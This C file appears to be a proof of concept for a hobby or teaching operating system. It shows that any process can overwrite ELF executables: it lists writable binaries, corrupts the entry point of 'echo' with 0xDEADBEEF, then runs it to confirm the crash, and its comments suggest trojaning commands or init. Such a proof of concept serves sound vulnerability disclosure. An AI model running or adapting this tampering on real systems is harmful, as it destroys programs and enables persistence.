/**
 * @file poc_elf.c
 * @brief 漏洞 PoC #2: ELF 加载无完整性校验
 * 
 * 漏洞类型: 结构性安全缺陷 - 缺乏可执行文件完整性验证
 * 
 * 漏洞原理:
 *   1. exec() 加载 ELF 文件时不验证文件完整性
 *   2. 任何进程可以修改磁盘上的可执行文件
 *   3. 下次执行时会运行被篡改的代码
 * 
 * 攻击场景:
 *   - 修改系统命令 (如 ls, ps) 植入恶意代码
 *   - 修改 init 进程实现持久化
 *   - 替换正常程序为恶意程序
 * 
 * 用法: poc_elf [mode]
 *   mode 0: 探测 - 列出可攻击的可执行文件
 *   mode 1: 攻击 - 篡改 echo 程序的 ELF 头
 *   mode 2: 验证 - 尝试执行被篡改的程序
 */

#include "stdio.h"
#include "string.h"

int main(int argc, char *argv[])
{
	int mode;
	int fd;
	int n;
	char buf[128];
	char *targets[5];
	int i;
	int ret;
	struct stat s;
	
	mode = 0;
	targets[0] = "echo";
	targets[1] = "pwd";
	targets[2] = "ls";
	targets[3] = "cat";
	targets[4] = "ps";
	
	printf("\n");
	printf("=============================================\n");
	printf(" PoC #2: ELF Loading Without Integrity Check\n");
	printf("=============================================\n\n");
	
	if (argc >= 2) {
		mode = argv[1][0] - '0';
		if (mode < 0 || mode > 2) {
			mode = 0;
		}
	}
	
	printf("[*] Vulnerability: No ELF integrity verification\n");
	printf("[*] My PID: %d\n", getpid());
	printf("[*] Test mode: %d\n\n", mode);
	
	switch (mode) {
	case 0:
		/* 信息收集：列出可执行文件 */
		printf("=== Mode 0: Executable Enumeration ===\n\n");
		printf("[*] Checking executable files...\n\n");
		
		for (i = 0; i < 5; i++) {
			ret = stat(targets[i], &s);
			if (ret != 0) {
				printf("  %s : Cannot stat\n", targets[i]);
				continue;
			}
			
			printf("  %s : size=%d mode=0x%x", targets[i], 
				s.st_size, s.st_mode);
			
			if (s.st_mode == I_REGULAR && s.st_size > 16) {
				fd = open(targets[i], O_RDWR);
				if (fd >= 0) {
					n = read(fd, buf, 4);
					close(fd);
					
					if (n >= 4 && (unsigned char)buf[0] == 0x7F && 
					    buf[1] == 'E' && buf[2] == 'L' && buf[3] == 'F') {
						printf("  [ELF] <-- TAMPERABLE!");
					} else {
						printf("  [read %d: %02X %02X %02X %02X]", n,
							(unsigned char)buf[0], (unsigned char)buf[1],
							(unsigned char)buf[2], (unsigned char)buf[3]);
					}
				}
			}
			printf("\n");
		}
		
		printf("\n[!] All ELF files can be modified by ANY process!\n");
		printf("[!] No signature, checksum, or permission check.\n");
		break;
	
	case 1:
		/* 攻击演示：篡改 echo 程序 */
		printf("=== Mode 1: Tamper Executable ===\n\n");
		
		/* 先用 stat 检查文件 */
		ret = stat("echo", &s);
		if (ret != 0) {
			printf("[-] Cannot stat 'echo'\n");
			return 1;
		}
		printf("[*] Target: 'echo', size=%d\n", s.st_size);
		
		fd = open("echo", O_RDWR);
		if (fd < 0) {
			printf("[-] Cannot open 'echo' for writing\n");
			return 1;
		}
		
		/* 先读取原始 ELF 头 */
		n = read(fd, buf, 32);
		
		if (n < 32) {
			printf("[-] Cannot read ELF header (got %d bytes)\n", n);
			close(fd);
			return 1;
		}
		
		printf("[*] Original ELF header:\n");
		printf("    Magic: %02X %02X %02X %02X\n", 
			(unsigned char)buf[0], (unsigned char)buf[1],
			(unsigned char)buf[2], (unsigned char)buf[3]);
		printf("    e_entry (offset 0x18): %02X %02X %02X %02X\n",
			(unsigned char)buf[0x18], (unsigned char)buf[0x19],
			(unsigned char)buf[0x1A], (unsigned char)buf[0x1B]);
		
		/* 验证是有效 ELF */
		if ((unsigned char)buf[0] != 0x7F || buf[1] != 'E' || 
		    buf[2] != 'L' || buf[3] != 'F') {
			printf("[-] Not a valid ELF file!\n");
			close(fd);
			return 1;
		}
		
		/* 关闭后重新打开以写入（重置文件位置） */
		close(fd);
		fd = open("echo", O_RDWR);
		if (fd < 0) {
			printf("[-] Cannot reopen for writing\n");
			return 1;
		}
		
		/* 破坏 e_entry（入口点），使程序跳转到无效地址 */
		buf[0x18] = 0xDE;
		buf[0x19] = 0xAD;
		buf[0x1A] = 0xBE;
		buf[0x1B] = 0xEF;
		
		printf("\n[*] Writing corrupted e_entry...\n");
		printf("    New e_entry: DE AD BE EF (0xEFBEADDE)\n");
		printf("[!] exec() will jump to invalid address!\n");
		
		n = write(fd, buf, 32);
		close(fd);
		
		if (n == 32) {
			printf("\n[+] SUCCESS! 'echo' program corrupted!\n");
			printf("[!] The program will crash on next exec()\n");
			printf("\n[!] Attack complete - no permission check!\n");
		} else {
			printf("[-] Write failed: %d bytes\n", n);
		}
		break;
	
	case 2:
		/* 验证：尝试执行被篡改的程序 */
		printf("=== Mode 2: Verify Corruption ===\n\n");
		
		/* 用 stat 检查文件 */
		ret = stat("echo", &s);
		if (ret != 0) {
			printf("[-] Cannot stat 'echo'\n");
			return 1;
		}
		printf("[*] File 'echo': size=%d\n", s.st_size);
		
		/* 先检查文件状态 */
		fd = open("echo", O_RDWR);
		if (fd < 0) {
			printf("[-] Cannot open 'echo'\n");
			return 1;
		}
		
		n = read(fd, buf, 32);
		close(fd);
		
		printf("[*] Current 'echo' e_entry: %02X %02X %02X %02X\n",
			(unsigned char)buf[0x18], (unsigned char)buf[0x19],
			(unsigned char)buf[0x1A], (unsigned char)buf[0x1B]);
		
		if ((unsigned char)buf[0x18] == 0xDE && (unsigned char)buf[0x19] == 0xAD) {
			printf("[+] e_entry is corrupted as expected.\n");
			printf("\n[*] Attempting to execute corrupted 'echo'...\n");
			printf("[!] Program will jump to 0xEFBEADDE and crash!\n\n");
			
			ret = fork("verify");
			if (ret == 0) {
				/* 子进程尝试执行 */
				exec("echo");
				/* 如果 exec 返回，说明失败 */
				printf("[CHILD] exec() failed - file is corrupted!\n");
				exit(1);
			} else if (ret > 0) {
				int status;
				wait(&status);
				printf("[*] Child exited with status: %d\n", status);
			}
		} else if ((unsigned char)buf[0] == 0x7F && buf[1] == 'E') {
			printf("[*] File appears to be valid ELF.\n");
			printf("[*] Run mode 1 first to corrupt it.\n");
		} else {
			printf("[?] Unknown file state (read %d bytes).\n", n);
		}
		break;
	}
	
	printf("\n");
	printf("=== Structural Vulnerability Summary ===\n");
	printf("1. No file permission model for executables\n");
	printf("2. Any process can modify ANY file on disk\n");
	printf("3. exec() loads ELF without checking magic\n");
	printf("4. Corrupted e_entry causes crash on exec\n");
	printf("\n");
	
	return 0;
}

